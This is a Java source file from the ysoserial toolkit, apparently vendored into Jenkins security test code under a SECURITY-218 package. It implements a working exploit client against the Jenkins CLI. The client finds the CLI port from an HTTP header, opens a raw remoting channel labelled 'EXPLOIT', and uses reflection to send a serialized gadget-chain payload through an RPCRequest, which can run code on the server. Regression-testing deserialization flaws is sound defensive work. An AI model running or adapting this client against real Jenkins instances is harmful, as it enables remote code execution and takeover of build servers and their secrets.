/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.exploit;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;

import javax.net.SocketFactory;

import hudson.remoting.Callable;
import hudson.remoting.Channel;
import hudson.remoting.Channel.Mode;
import hudson.remoting.ChannelBuilder;
import jenkins.security.security218.ysoserial.payloads.ObjectPayload.Utils;

/**
 * Jenkins CLI client
 * 
 * Jenkins unfortunately is still using a custom serialization based
 * protocol for remote communications only protected by a blacklisting
 * application level filter.
 * 
 * This is a generic client delivering a gadget chain payload via that protocol. 
 * 
 * @author mbechler
 *
 */
public class JenkinsCLI {
    public static final void main ( final String[] args ) {
        if ( args.length < 3 ) {
            System.err.println(JenkinsCLI.class.getName() + " <jenkins_url> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Object payloadObject = Utils.makePayloadObject(args[1], args[2]);

        String jenkinsUrl = args[ 0 ];
        Channel c = null;
        try {
            InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
            c = JenkinsCLI.openChannel(isa);
            c.call(getPropertyCallable(payloadObject));
        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }
        finally {
            if ( c != null ) {
                try {
                    c.close();
                }
                catch ( IOException e ) {
                    e.printStackTrace(System.err);
                }
            }
        }
        Utils.releasePayload(args[1], payloadObject);
    }

    public static Callable<?, ?> getPropertyCallable ( final Object prop )
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");
        Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
        reqCons.setAccessible(true);
        Object getJarLoader = reqCons
                .newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[] {
                    prop
        });
        return (Callable<?, ?>) getJarLoader;
    }

    public static InetSocketAddress getCliPort ( String jenkinsUrl ) throws MalformedURLException, IOException {
        URL u = new URL(jenkinsUrl);
    
        URLConnection conn = u.openConnection();
        if ( ! ( conn instanceof HttpURLConnection ) ) {
            System.err.println("Not a HTTP URL");
            throw new MalformedURLException();
        }
    
        HttpURLConnection hc = (HttpURLConnection) conn;
        if ( hc.getResponseCode() >= 400 ) {
            System.err.println("* Error connection to jenkins HTTP " + u);
        }
        int clip = Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port"));
    
        return new InetSocketAddress(u.getHost(), clip);
    }

    public static Channel openChannel ( InetSocketAddress isa ) throws IOException, SocketException {
        System.err.println("* Opening socket " + isa);
        Socket s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
        s.setKeepAlive(true);
        s.setTcpNoDelay(true);
    
        System.err.println("* Opening channel");
        OutputStream outputStream = s.getOutputStream();
        DataOutputStream dos = new DataOutputStream(outputStream);
        dos.writeUTF("Protocol:CLI-connect");
        ExecutorService cp = Executors.newCachedThreadPool(new ThreadFactory() {
    
            public Thread newThread ( Runnable r ) {
                Thread t = new Thread(r, "Channel");
                t.setDaemon(true);
                return t;
            }
        });
        Channel c = new ChannelBuilder("EXPLOIT", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);
        System.err.println("* Channel open");
        return c;
    }
}
